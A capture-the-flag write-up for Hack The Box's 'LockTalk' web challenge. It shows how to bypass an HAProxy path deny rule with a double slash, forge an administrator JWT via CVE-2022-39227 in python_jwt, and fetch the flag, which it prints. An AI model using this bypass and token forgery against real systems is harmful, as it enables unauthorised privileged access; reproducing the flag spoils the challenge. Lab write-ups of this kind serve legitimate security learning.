# LockTalk

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance
against the rampant chaos inflicted by ransomware groups. In a world plunged
into turmoil by malicious cyber threats, LockTalk stands as a formidable force,
dedicated to protecting society from the insidious grip of ransomware. Chosen
participants, tasked with representing their districts, navigate a perilous
landscape fraught with ethical quandaries and treacherous challenges
orchestrated by LockTalk. Their journey intertwines with the organization's
mission to neutralize ransomware threats and restore order to a fractured
world. As players confront internal struggles and external adversaries, their
decisions shape the fate of not only themselves but also their fellow citizens,
driving them to unravel the mysteries surrounding LockTalk and choose between
succumbing to despair or standing resilient against the encroaching darkness.

## How to Play

By looking at `conf/requirements.txt` we can see a specific version of
python_jwt is used. Web search for `python_jwt==3.3.3 cve explot github` gives
us great [results](https://github.com/advisories/GHSA-5p8v-58qm-c7fp). "An
attacker who obtains a JWT can arbitrarily forge its contents without knowing
the secret key."

The in the server website the first get request a forbidden, and checking the
page `http://83.136.249.138:52682/api/v1/get_ticket` gives the same result.

In the `conf/haproxy.cfg` we can see this request is denied because it checks
if path begins with `/api/v1/get_ticket`.

```cfg
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

To bypass this we can use double slashes in the request. so the path begins with
`//` and the check fails. The request is then allowed.

```
http://83.136.249.138:52682//api/v1/get_ticket
```

And we get a ticket.

Search for `CVE-2022-39227 github` to find a
[script](https://github.com/user0x1337/CVE-2022-39227) to exploit the
vulnerability.

Add the token and the role to claim to the script.

```python
token = "eyJhbG
claim = "role=administrator"
```

The add the following to the script. To send a get request to the flag endpoint
that is in `/api/v1/flag` with the new payload.

```python
import requests
base = "http://83.136.249.138:52682/"
r = requests.get(base + "/api/v1/flag", headers={"Authorization": new_payload})
print(r.text)
```

Run the [script](cve_2022_39227.py) and get the flag.

## Flag

```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```
